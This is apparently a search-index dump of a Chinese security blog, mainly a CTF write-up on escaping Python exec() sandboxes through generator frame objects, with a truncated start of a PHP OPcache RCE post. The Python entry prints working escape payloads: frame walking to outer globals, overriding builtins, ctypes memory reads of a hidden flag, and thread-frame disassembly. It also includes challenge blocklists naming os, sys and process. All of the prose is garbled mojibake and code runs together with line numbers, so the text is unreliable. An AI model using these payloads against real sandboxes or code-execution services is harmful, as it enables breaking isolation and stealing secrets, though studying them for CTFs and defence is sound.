[{"title":"pythonåˆ©ç”¨å¸§æ ˆæ²™ç®±é€ƒé€¸","path":"/2024/06/07/pythonå¸§æ ˆæ²™ç®±é€ƒé€¸/","content":"pythonåˆ©ç”¨å¸§æ ˆæ²™ç®±é€ƒé€¸åŸºç¡€çŸ¥è¯†ç”Ÿæˆå™¨ åœ¨Pythonä¸­ï¼Œè¿™ç§ä¸€è¾¹å¾ªç¯ä¸€è¾¹è®¡ç®—çš„æœºåˆ¶ï¼Œç§°ä¸ºç”Ÿæˆå™¨ï¼šgeneratorã€‚ generatorçš„å‡½æ•°ï¼Œåœ¨æ¯æ¬¡è°ƒç”¨next()çš„æ—¶å€™æ‰§è¡Œï¼Œé‡åˆ°yieldè¯­å¥è¿”å›ï¼Œå†æ¬¡æ‰§è¡Œæ—¶ä»ä¸Šæ¬¡è¿”å›çš„yieldè¯­å¥å¤„ç»§ç»­æ‰§è¡Œã€‚ ä¸¾ä¸ªç®€å•æ —å­ï¼š 123456789def f(): a=1 while True: yield a a+=1f=f()print(next(f)) #1print(next(f)) #2print(next(f)) #3 å¦‚æœæˆ‘ä»¬ç»™aå®šä¹‰ä¸€ä¸ªèŒƒå›´ï¼Œa&lt;&#x3D;100 ï¼Œå¯ä»¥ä½¿ç”¨forè¯­å¥ä¸€æ¬¡æ€§è¾“å‡º 12345678def f(): a=1 for i in range(100): yield a a+=1f=f()for value in f: print(value) ç”Ÿæˆå™¨è¡¨è¾¾å¼generatorå’ŒliståšåŒºåˆ«çš„æ˜¯æœ€å¤–å±‚çš„()ï¼Œè€Œlistæ˜¯[]ã€‚ 1234x=(i * i for i in range(10))#next(x)for n in x: print(n) ä¸Šé¢ä¸€å †å¬ä¸å¤ªæ‡‚ä¹Ÿæ²¡å¤šå¤§å…³ç³»ï¼Œåªéœ€è¦çŸ¥é“ä¸€ç‚¹generatorè·å–yieldå®šä¹‰çš„å€¼é€šè¿‡next()å‡½æ•° or forå¾ªç¯ï¼ˆforå¾ªç¯çš„åŸç†æ˜¯ç”Ÿæˆå™¨æ˜¯ç‰¹æ®Šçš„è¿­ä»£å™¨ï¼‰ ç”Ÿæˆå™¨å±æ€§ gi_code: ç”Ÿæˆå™¨å¯¹åº”çš„codeå¯¹è±¡ã€‚ gi_frame: ç”Ÿæˆå™¨å¯¹åº”çš„frameï¼ˆæ ˆå¸§ï¼‰å¯¹è±¡ã€‚ gi_running: ç”Ÿæˆå™¨å‡½æ•°æ˜¯å¦åœ¨æ‰§è¡Œã€‚ç”Ÿæˆå™¨å‡½æ•°åœ¨yieldä»¥åã€æ‰§è¡Œyieldçš„ä¸‹ä¸€è¡Œä»£ç å‰å¤„äºfrozençŠ¶æ€ï¼Œæ­¤æ—¶è¿™ä¸ªå±æ€§çš„å€¼ä¸º0ã€‚ gi_yieldfromï¼šå¦‚æœç”Ÿæˆå™¨æ­£åœ¨ä»å¦ä¸€ä¸ªç”Ÿæˆå™¨ä¸­ yield å€¼ï¼Œåˆ™ä¸ºè¯¥ç”Ÿæˆå™¨å¯¹è±¡çš„å¼•ç”¨ï¼›å¦åˆ™ä¸º Noneã€‚ gi_frame.f_localsï¼šä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«ç”Ÿæˆå™¨å½“å‰å¸§çš„æœ¬åœ°å˜é‡ã€‚ ç€é‡çœ‹ä¸€ä¸‹ gi_frame å±æ€§ gi_frame æ˜¯ä¸€ä¸ªä¸ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰å’Œåç¨‹ï¼ˆcoroutineï¼‰ç›¸å…³çš„å±æ€§ã€‚å®ƒæŒ‡å‘ç”Ÿæˆå™¨æˆ–åç¨‹å½“å‰æ‰§è¡Œçš„å¸§å¯¹è±¡ï¼ˆframe objectï¼‰ï¼Œå¦‚æœè¿™ä¸ªç”Ÿæˆå™¨æˆ–åç¨‹æ­£åœ¨æ‰§è¡Œçš„è¯ã€‚å¸§å¯¹è±¡è¡¨ç¤ºä»£ç æ‰§è¡Œçš„å½“å‰ä¸Šä¸‹æ–‡ï¼ŒåŒ…å«äº†å±€éƒ¨å˜é‡ã€æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ç­‰ä¿¡æ¯ã€‚ æ¯”å¦‚ï¼š 123456789101112131415def my_generator(): yield 1 yield 2 yield 3gen = my_generator()# è·å–ç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯frame = gen.gi_frame# è¾“å‡ºç”Ÿæˆå™¨çš„å½“å‰å¸§ä¿¡æ¯print(&quot;Local Variables:&quot;, frame.f_locals)print(&quot;Global Variables:&quot;, frame.f_globals)print(&quot;Code Object:&quot;, frame.f_code)print(&quot;Instruction Pointer:&quot;, frame.f_lasti) å¸§æ ˆ(stack frame)æ ˆå¸§åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š f_locals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å±€éƒ¨å˜é‡ã€‚é”®æ˜¯å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚ f_globals: ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•æ‰€åœ¨æ¨¡å—çš„å…¨å±€å˜é‡ã€‚é”®æ˜¯å…¨å±€å˜é‡åï¼Œå€¼æ˜¯å˜é‡çš„å€¼ã€‚ f_code: ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚ f_lasti: æ•´æ•°ï¼Œè¡¨ç¤ºæœ€åæ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤çš„ç´¢å¼•ã€‚ f_back: æŒ‡å‘ä¸Šä¸€çº§è°ƒç”¨æ ˆå¸§çš„å¼•ç”¨ï¼Œç”¨äºæ„å»ºè°ƒç”¨æ ˆã€‚ æ¯ä¸ªæ ˆå¸§éƒ½ä¼šä¿å­˜å½“æ—¶çš„ py å­—èŠ‚ç å’Œè®°å½•è‡ªèº«ä¸Šä¸€å±‚çš„æ ˆå¸§ ï¼ï¼ï¼ï¼ï¼ åˆ©ç”¨å¸§æ ˆæ²™ç®±é€ƒé€¸åŸç†å°±æ˜¯é€šè¿‡ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡é€šè¿‡f_backï¼ˆè¿”å›å‰ä¸€å¸§ï¼‰ä»è€Œé€ƒé€¸å‡ºå»è·å–globalså…¨å±€ç¬¦å·è¡¨ æ —å­ï¼š 123456789101112131415161718s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ # frame = [x for x in g][0] # ç”±äºç”Ÿæˆå™¨ä¹Ÿæ˜¯è¿­ä»£å™¨ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è·å–åˆ°ç”Ÿæˆå™¨çš„å¸§æ ˆ b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return bb=waff()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals)print(locals[&quot;b&quot;]) 12345678910111213141516171819s3cret = &quot;this is flag&quot;codes = &#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() # ç”Ÿæˆå™¨ # frame = next(g) # è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ frame = [x for x in g][0] # ç”±äºç”Ÿæˆå™¨ä¹Ÿæ˜¯è¿­ä»£å™¨ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥è·å–åˆ°ç”Ÿæˆå™¨çš„å¸§æ ˆ b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] # è¿”å›å¹¶è·å–å‰ä¸€çº§æ ˆå¸§çš„globals return bb = waff()&#x27;&#x27;&#x27;locals_dict = &#123;&#x27;s3cret&#x27;: s3cret&#125; # è¿™é‡Œç¨å¾®æ³¨æ„ä¸€ä¸‹f_globalsä¸­æ²¡æœ‰æ‰¾åˆ°s3cretå˜é‡code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code, locals_dict)print(locals_dict[&quot;b&quot;]) ä»£ç è¯´æ˜ï¼š ä¹‹å‰æåˆ°çš„nextè·å–yieldå®šä¹‰çš„å€¼ï¼Œè¿™é‡Œè·å–çš„å°±æ˜¯g.gi_frame.f_back ä½¿ç”¨g.gi_frame.f_backçš„è¯ï¼Œé‚£ä¹ˆg = f()å°±å¿…é¡»ä¸ºgï¼Œç”¨çš„å°±æ˜¯è¿™ä¸ªç”Ÿæˆå™¨å¯¹è±¡çš„æ ˆå¸§ compile(codes, &quot;test&quot;, &quot;exec&quot;)å°±æ˜¯è®¾ç½®äº†åç§°ä¸ºtestçš„pythonæ²™ç®±ç¯å¢ƒ ç†è§£ä¸€ä¸‹é€ƒé€¸çš„é¡ºåºï¼š 1234567891011121314151617181920s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ print(frame) print(frame.f_back) print(frame.f_back.f_back)waff()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals) å³ï¼š 1f -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(ex1.py) æˆåŠŸé€ƒé€¸ è·å–åˆ°å¤–éƒ¨çš„æ ˆå¸§ï¼Œå°±å¯ä»¥ç”¨f_globalså»è·å–æ²™ç®±å¤–çš„å…¨å±€å˜é‡äº† ä½†æ˜¯yield g.gi_frame.f_backå¹¶ä¸èƒ½ä¿®æ”¹ä¸ºyield g.gi_frame è¿™æ ·è·å–åˆ°çš„æ ˆå¸§ç»è¿‡f_backåè·å¾—çš„æ˜¯None è¦æ˜¯å†æ¥ä¸€ä¸ªf_backå°±ä¼šæŠ¥é”™ frame.f_back.f_back.f_back.f_back å°è¯•è®¿é—®çš„æ˜¯ waff å‡½æ•°çš„å¤–éƒ¨è°ƒç”¨è€…çš„æ ˆå¸§å¯¹è±¡ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œwaff æ˜¯æœ€å¤–å±‚å‡½æ•°ï¼Œæ²¡æœ‰å¤–éƒ¨å‡½æ•°è°ƒç”¨å®ƒ å†å†™ä¸€å±‚å°±èƒ½ç†è§£äº†ï¼š 1234567891011121314151617181920212223242526s3cret=&quot;this is flag&quot;codes=&#x27;&#x27;&#x27;def xhw(): def waff(): def f(): yield g.gi_frame.f_back g = f() #ç”Ÿæˆå™¨ frame = next(g) #è·å–åˆ°ç”Ÿæˆå™¨çš„æ ˆå¸§å¯¹è±¡ print(frame) print(frame.f_back) print(frame.f_back.f_back) print(frame.f_back.f_back.f_back) print(frame.f_back.f_back.f_back.f_back) waff()xhw()&#x27;&#x27;&#x27;locals=&#123;&#125;code = compile(codes, &quot;test&quot;, &quot;exec&quot;)exec(code,locals) globalsä¸­çš„__builtinså­—æ®µ__builtins__ æ¨¡å—æ˜¯ Python è§£é‡Šå™¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ç³»åˆ—å†…ç½®å‡½æ•°ã€å¼‚å¸¸å’Œå…¶ä»–å†…ç½®å¯¹è±¡ã€‚ä½¿ç”¨ dir(__builtins__) æ¥æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„å†…ç½®å‡½æ•°å’Œå¼‚å¸¸çš„åˆ—è¡¨ 12&gt;&gt;&gt; dir(__builtins__)[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;WindowsError&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;all&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;] L3HCTF2024æºç  1234567891011121314151617181920212223242526272829303132333435363738import sysimport oscodes=&#x27;&#x27;&#x27;&lt;&lt;codehere&gt;&gt;&#x27;&#x27;&#x27;try: codes.encode(&quot;ascii&quot;)except UnicodeEncodeError: exit(0)if &quot;__&quot; in codes: exit(0)codes+=&quot; res=factorization(c)&quot;locals=&#123;&quot;c&quot;:&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;,&quot;__builtins__&quot;: None&#125;res=set()def blackFunc(oldexit): def func(event, args): blackList = [&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;] for i in blackList: if i in (event + &quot;&quot;.join(str(s) for s in args)).lower(): print(i) oldexit(0) return funccode = compile(codes, &quot;&lt;judgecode&gt;&quot;, &quot;exec&quot;)sys.addaudithook(blackFunc(os._exit))exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals)p=int(locals[&quot;res&quot;][0])q=int(locals[&quot;res&quot;][1])if(p&gt;1e5 and q&gt;1e5 and p*q==int(&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;)): print(&quot;Correct!&quot;,end=&quot;&quot;)else: print(&quot;Wrong!&quot;,end=&quot;&quot;) ä¸Šè¿°ä»£ç å¤§æ¦‚å°±æ˜¯é€šè¿‡execæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿”å›çš„på’Œqéœ€è¦æ»¡è¶³ifè¯­å¥ è¿‡æ»¤äº†__ï¼Œè¿˜æœ‰è¿‡æ»¤ä¸€äº›å…¶ä»–ï¼Œè¿™å¯¼è‡´ä¸èƒ½ä½¿ç”¨gcå»è·å–å¯¹è±¡å¼•ç”¨ï¼ˆä¸‹é¢çš„æ®è¯´å¯ä»¥ç”¨gcç§’ï¼‰ 1234if &quot;__&quot; in codes: exit(0) blackList = [&quot;process&quot;,&quot;os&quot;,&quot;sys&quot;,&quot;interpreter&quot;,&quot;cpython&quot;,&quot;open&quot;,&quot;compile&quot;,&quot;__new__&quot;,&quot;gc&quot;] æœ€å…³é”®çš„æ˜¯ &#123;&quot;__builtins__&quot;: None&#125; ç½®ç©ºäº†__builtins__ 1exec(code,&#123;&quot;__builtins__&quot;: None&#125;,locals) æ ¹æ®ä¸Šè¿°æ¡ä»¶ï¼Œè¿™é“é¢˜çš„è§£é¢˜æ€è·¯å°±æ˜¯é€šè¿‡æ ˆå¸§å¯¹è±¡é€ƒé€¸å‡ºæ²™ç®±ä»è€Œè·å–åˆ°æ²™ç®±å¤–çš„globals 123a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]globals=a.f_back.f_back.f_globals 123456a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]STYLUSa=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]globals=a.f_back.f_back.f_globals #è‡ªè¡Œæ§åˆ¶f_backï¼Œé€ƒé€¸åˆ°å¤–éƒ¨æ–‡ä»¶å³å¯ï¼Œå¦‚æœæ˜¯flaskï¼Œä¸è¦é€ƒé€¸è¿‡å¤´äº†åˆ°æºæ–‡ä»¶å»äº†STYLUS ç„¶åå°†æ²™ç®±å¤–éƒ¨çš„intå‡½æ•°ä¿®æ”¹ä¸ºfakeintå‡½æ•°å³å¯ 123456def fake_int(i): return 100001 * 100002a=(a.gi_frame.f_back.f_back for i in [1])a=[x for x in a][0]builtin =a.f_back.f_back.f_globals[&quot;_&quot;*2+&quot;builtins&quot;+&quot;_&quot;*2]builtin.int=fake_int ç¬¬ä¹å±Šä¸­å›½æµ·æ´‹å¤§å­¦ä¿¡æ¯å®‰å…¨ç«èµ›æºç  12345678910111213141516171819202122232425262728293031323334353637383940414243from flask import *import ioimport timeapp = Flask(__name__)black_list = [ &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;SystemExit&#x27;, &#x27;breakpoint&#x27;, &#x27;compile&#x27;, &#x27;exit&#x27;, &#x27;memoryview&#x27;, &#x27;open&#x27;, &#x27;quit&#x27;, &#x27;input&#x27;]new_builtins = dict([ (key, val) for key, val in __builtins__.__dict__.items() if key not in black_list])flag = &quot;flag&#123;xxxxxxxxx&#125;&quot;flag = &quot;DISPOSED&quot;@app.route(&quot;/&quot;)def index(): return redirect(&quot;/static/index.html&quot;)@app.post(&quot;/run&quot;)def run(): out = io.StringIO() script = str(request.form[&quot;script&quot;]) def wrap_print(*args, **kwargs): kwargs[&quot;file&quot;] = out print(*args, **kwargs) new_builtins[&quot;print&quot;] = wrap_print try: exec(script, &#123;&quot;__builtins__&quot;: new_builtins&#125;) except Exception as e: wrap_print(e) ret = out.getvalue() out.close() return rettime.sleep(5) # current source file is deletedapp.run(&#x27;0.0.0.0&#x27;, port=9001) flagåœ¨æºç ä¸­ï¼Œä½†æ˜¯æºç è¢«åˆ é™¤ï¼Œæ²¡æœ‰ /procç›®å½• è¦è·å¾—è¢«è¦†å†™çš„ flag å†…å®¹åªå‰©ä¸€ä¸ªåœ°æ–¹å¯ä»¥æ‰¾ï¼Œå°±æ˜¯ä¾é  python è§£æè‡ªèº«è¿›ç¨‹çš„å†…å­˜ cpython çš„å®ç°ä¸­æš´éœ²äº†è·å– python æ ˆå¸§çš„æ–¹æ³• è€Œæ¯ä¸ªæ ˆå¸§éƒ½ä¼šä¿å­˜å½“æ—¶çš„ py å­—èŠ‚ç å’Œè®°å½•è‡ªèº«ä¸Šä¸€å±‚çš„æ ˆå¸§ è€Œå¯¹ flag çš„èµ‹å€¼çš„å­—èŠ‚ç è‚¯å®šå­˜åœ¨äºæŸä¸ªæ ˆå¸§ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦ä»å½“å‰æ ˆå¸§å‘ä¸Šæ‰¾å°±è¡Œäº† æ³•ä¸€åˆ©ç”¨ ctypesæ¨¡å—çš„æŒ‡é’ˆï¼Œå°†flagåœ°å€å‘¨å›´çš„å€¼è¯»ä¸€ä¸‹ï¼Œå®ç°ä¸€ä¸ªä»å†…å­˜è¯»æºç  å› ä¸ºçœŸæ­£çš„flagåœ¨è¦†ç›–çš„flagä¹‹å‰ï¼Œæ‰€ä»¥è¯»åˆ°å‡çš„flagçš„åœ°å€åï¼Œå¾€å‰è¯»å–å³å¯ è¿™é‡Œç”¨äº†char æŒ‡é’ˆï¼Œè¯»å‡ºæ¥çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² æœ€ç»†èŠ‚çš„æ˜¯æ¯æ¬¡ä½ç§»8çš„å€æ•°ã€‚ï¼ˆå¯ä»¥è‡ªè¡Œå¯¹æ¯”ä»»æ„ä¸¤ä¸ªå˜é‡çš„åœ°å€ï¼Œå¯ä»¥å‘ç°å®ƒä»¬çš„å·®å€¼éƒ½æ˜¯8çš„å€æ•°ï¼‰ 123456789101112a=(a.gi_frame.f_back.f_back for i in [1])a = [x for x in a][0]b = a.f_back.f_globalsflag_id = id(b[&#x27;flag&#x27;]) #id()å‡½æ•°ç”¨äºè¯»å–å†…å­˜åœ°å€ctypes = b[&quot;__builtins__&quot;].__import__(&#x27;ctypes&#x27;)#print(ctypes)for i in range(10000):\ttxt = ctypes.cast((flag_id-8*i),ctypes.c_char_p).value\tif b&quot;flag&quot; in txt: print(txt)STYLUS å®˜æ–¹wpä½¿ç”¨çš„æ˜¯éå¸¸æ™®é€šçš„ç»§æ‰¿é“¾è·å–globalså¯¹è±¡ï¼Œç„¶åä»çº¿ç¨‹ä¸Šå»æ‰¾æ ˆå¸§ è€Œä¸”flask ä½¿ç”¨äº†å¤šçº¿ç¨‹å»å¤„ç†æ¯ä¸ªè¯·æ±‚ï¼Œè¿™å¯¼è‡´ç›´æ¥åœ¨å½“å‰çº¿ç¨‹çš„æ ˆå¸§å‘ä¸Šæ‰¾ä¼šæ‰¾ä¸åˆ°ä¸»çº¿ç¨‹çš„ flagï¼Œéœ€è¦ä»ä¸»çº¿ç¨‹æ ˆå¸§å‘ä¸Šæ‰¾ 123456789101112131415161718192021sys = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;sys&#x27;)io = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;io&#x27;)dis = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;dis&#x27;)threading = print.__globals__[&quot;__builtins__&quot;].__import__(&#x27;threading&#x27;)print(threading.enumerate()) #è·å–æ‰€æœ‰æ´»è·ƒçº¿ç¨‹print(threading.main_thread()) #è·å–ä¸»çº¿ç¨‹print(threading.main_thread().ident) # è·å–ä¸»çº¿ç¨‹æ ‡è¯†ç¬¦print(sys._current_frames()) # è·å–æ‰€æœ‰çº¿ç¨‹çš„å †æ ˆå¸§å¯¹è±¡print(sys._current_frames()[threading.main_thread().ident]) #è·å–åˆ°ä¸»çº¿ç¨‹çš„å †æ ˆå¸§å¯¹è±¡frame = sys._current_frames()[threading.main_thread().ident]while frame is not None:\tout = io.StringIO() # å†…å­˜åˆ›å»ºå­—ç¬¦ä¸²I/Oæµ\tdis.dis(frame.f_code,file=out) # å°†å½“å‰å †æ ˆå¸§æ‰€å¯¹åº”çš„å‡½æ•°çš„å­—èŠ‚ç è¿›è¡Œåæ±‡ç¼–\tcontent = out.getvalue() #è·å–åæ±‡ç¼–çš„ç»“æœ\tout.close()\tprint(content)\tframe = frame.f_backPYTHON gcL3HCTFé‚£é¢˜ç¦ç”¨äº†gcï¼Œä½†æ˜¯è¿™é¢˜æ²¡æœ‰ï¼Œæœ‰å¸ˆå‚…ç”¨è¿™ä¸ªç§’äº†å¥½åƒ 123print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())#&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;STYLUS ä¸œè¥¿å¤ªå¤šäº†ï¼Œæœ‰ç‚¹å¡ é¢˜å¤–è¯ï¼š è¿™å›å›½èµ›é‡åˆ°äº†æˆ‘ç«Ÿç„¶æ²¡åšï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼ï¼Œæ²¡åšï¼Ÿï¼Ÿï¼Ÿï¼ˆæˆ‘çœŸè¯¥æ­»ï¼‰ å‚è€ƒï¼š pythonåˆ©ç”¨æ ˆå¸§è¿›è¡Œæ²™ç®±é€ƒé€¸ Pythonåˆ©ç”¨æ ˆå¸§æ²™ç®±é€ƒé€¸ ç”Ÿæˆå™¨ L3HCTF-intractable problem"},{"title":"PHP7/8 OPCACHEç¼“å­˜æ–‡ä»¶å¯¼è‡´çš„RCE","path":"/2024/06/07/Opcache-PHP/","content":"PHP7&#x2F;8 OPCACHEç¼“å­˜æ–‡ä»¶å¯¼è‡´çš„RCEOPcacheåŸºç¡€ OPcacheï¼ˆOpcode Cacheï¼‰æ˜¯ PHP çš„ä¸€ä¸ªå†…ç½®çš„åŠ é€Ÿæ¨¡å—ï¼Œé€šè¿‡è§£æçš„ PHP è„šæœ¬é¢„ç¼–è¯‘å­˜æ”¾åœ¨å…±äº«å†…å­˜ä¸­çš„å­—èŠ‚ç æ¥é¿å…æ¯æ¬¡åŠ è½½å’Œè§£æ PHP 